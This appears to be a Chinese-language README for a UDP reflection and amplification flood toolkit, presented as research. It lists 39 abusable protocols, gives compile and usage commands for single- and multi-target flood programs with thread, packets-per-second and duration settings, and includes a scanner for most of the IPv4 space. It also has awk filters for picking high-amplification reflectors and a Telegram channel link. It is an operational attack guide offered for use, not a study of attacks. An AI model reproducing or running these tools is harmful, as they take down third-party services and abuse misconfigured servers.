# UDP Flood 泛洪研究

## 1 . 研究概述
- 所有协议的端口与 **payload** 参数均独立保存在对应的 `.ini` 文件中，方便灵活增删改。
- 通过不同的 C 程序模板可完成泛洪、扫描、反射器收集等多类任务。

## 2 . 当前研究协议 (共 39 种)

| 序号 | 协议       | 序号 | 协议       | 序号 | 协议       |
| :--: | ---------- | :--: | ---------- | :--: | ---------- |
| 1    | afs        | 14   | dvr        | 27   | sentinel   |
| 2    | ard        | 15   | fivem      | 28   | slp        |
| 3    | bfd        | 16   | ipsec      | 29   | snmp       |
| 4    | chargen    | 17   | jenkins    | 30   | source     |
| 5    | citrix     | 18   | lantronix  | 31   | ssdp       |
| 6    | coap       | 19   | ldap       | 32   | steam      |
| 7    | crestron   | 20   | mssql      | 33   | stun       |
| 8    | digiman    | 21   | natpmp     | 34   | text       |
| 9    | dns        | 22   | netbios    | 35   | ubiquiti   |
| 10   | dtls       | 23   | ntp        | 36   | vxworks    |
| 11   | dvr        | 24   | openvpn    | 37   | xdmcp      |
| 12   | fivem      | 25   | phmgmt     | 38   | —          |
| 13   | ipsec      | 26   | plex       | 39   | —          |

> **说明**  
> 协议表可按需扩充；仅需在 目录下添加或调整对应的 **INI** 文件即可。

---

## 3 . 程序与用法

### 3 .1 `flood.c` — 单目标泛洪模板
```bash
# 编译
gcc flood.c -O3 -static -o flood

# 用法
./flood <配置文件> <IP地址> <端口> <反射IP文件> <线程数> <PPS> <持续秒数>
```

### 3 .2 `attack.c` — 多目标均衡泛洪
```bash
# 编译
gcc attack.c -O3 -static -o attack

# 用法
./attack <配置文件> <目标IP文件> <端口> <反射IP文件> <线程数> <PPS> <持续秒数>
```

### 3 .3 `sendcan.c` — 基于物理网卡的高速扫描
```bash
# 编译
gcc -std=gnu11 -D_GNU_SOURCE -O3 -march=native sendcan.c -pthread -static -o sendcan

# 用法
./sendcan <配置文件> <接口> <源MAC> <目标MAC> <源IP> <起始IP> <结束IP> <线程数> <PPS上限>
```

#### 获取 MAC/IP 示例
```bash
# 网卡 (eth0) 自身 MAC
ip addr show dev eth0 | awk '/link\/ether/ {print $2}'

# 网关 MAC
ip neigh show to $(ip route | awk '/default/ {print $3}') | awk '{print $5}'
```

> **建议扫描段** `1.0.0.0 – 235.0.0.0`，其后网段价值较低。

### 3 .4 `rend.c` — 反射器接收与记录
```bash
# 编译
gcc rend.c -O3 -static -o rend

# 用法
./rend <配置文件> <结果文件>
```
*默认过滤：仅记录包长 ≥ 8 字节的响应。*

---

## 4 . 数据过滤示例

### 4 .1 简单过滤（按包大小）
```bash
awk '$2 > <大小阈值> {print $1}' <源文件>   | sort -n | uniq | sort -R > <结果文件>
# 例：只保留包体 >100 字节的 coap 数据
awk '$2 > 100 {print $1}' text/coap.txt   | sort -n | uniq | sort -R > text/coapamp.txt
```

### 4 .2 双重条件过滤  
（包大小 ≥ N 且相同 IP 出现次数 ≥ M）
```bash
cat <源文件>   | sort   | awk '$2 >= <大小阈值>'   | awk '{print $1}'   | uniq -c   | awk '$1 >= <次数阈值>'   | awk '{print $2}' > <结果文件>
# 例：ssdp 反射器出现 ≥ 10 次且包长 ≥ 200
cat reflector/ssdpdata.txt   | sort   | awk '$2 >= 200'   | awk '{print $1}'   | uniq -c   | awk '$1 >= 10'   | awk '{print $2}' > reflector/ssdpamp.txt
```

## 5 . 交流频道

- 加入我们的 Telegram 交流频道：[https://t.me/+0Ny7opchzLMyNjk1](https://t.me/+0Ny7opchzLMyNjk1)

---

## 6 . 使用提示

- **静态文件分发**  
  请运行 `./opts`，程序会自动绑定 `0.0.0.0:56102`，用于建立反射文件分发服务。
- **示例反射 IP 文件**  
  在项目根目录的 `text/` 目录中，已存放若干用于演示的反射 IP 文件。  
  命名规则：`<协议名称>amp.txt`，例如 `coapamp.txt`、`ssdpamp.txt` 等。
